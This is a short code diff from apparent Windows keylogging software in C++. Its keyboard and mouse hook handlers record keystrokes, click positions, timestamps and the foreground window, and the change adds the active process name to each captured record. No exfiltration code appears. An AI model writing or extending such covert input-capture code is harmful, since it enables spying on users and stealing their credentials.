@@ -67,8 +67,13 @@ void Packager::addKey(int nCode, WPARAM wParam, LPARAM lParam) {
 		GetKeyboardState(kbdState);
 		WCHAR buff[2];
 		PaquetKeys *tmp = new PaquetKeys();
+
+		std::string fullActiveName;
+		fullActiveName = *SelfUtils::getNameFromPID(SelfUtils::getActiveWindowPID()) + " - "
+			+ *SelfUtils::getActiveWindowTitle();
+		tmp->setActive(fullActiveName);
+
 		tmp->setDate(SelfUtils::secondsSinceEpoch());
-		tmp->setActive(*SelfUtils::getActiveWindowTitle());
 		tmp->setPid(SelfUtils::getActiveWindowPID());
 		std::string	str;
 		if (_shift) {
@@ -105,9 +110,15 @@ void Packager::addClick(int nCode, WPARAM wParam, LPARAM lParam) {
 	std::cout << "addclick" << std::endl;
 	MSLLHOOKSTRUCT* info = (MSLLHOOKSTRUCT*)lParam;
 	PaquetMouse *tmp = new PaquetMouse();
+
+	std::string fullActiveName;
+	fullActiveName = *SelfUtils::getNameFromPID(SelfUtils::getActiveWindowPID()) + "-"
+		+ *SelfUtils::getActiveWindowTitle();
+	tmp->setActive(fullActiveName);
+
 	tmp->setDate(SelfUtils::secondsSinceEpoch());
-	tmp->setActive(*SelfUtils::getActiveWindowTitle());
 	tmp->setPid(SelfUtils::getActiveWindowPID());
+
 	tmp->setX(info->pt.x);
 	tmp->setY(info->pt.y);
 	WORD highOrder = info->mouseData >> 16;
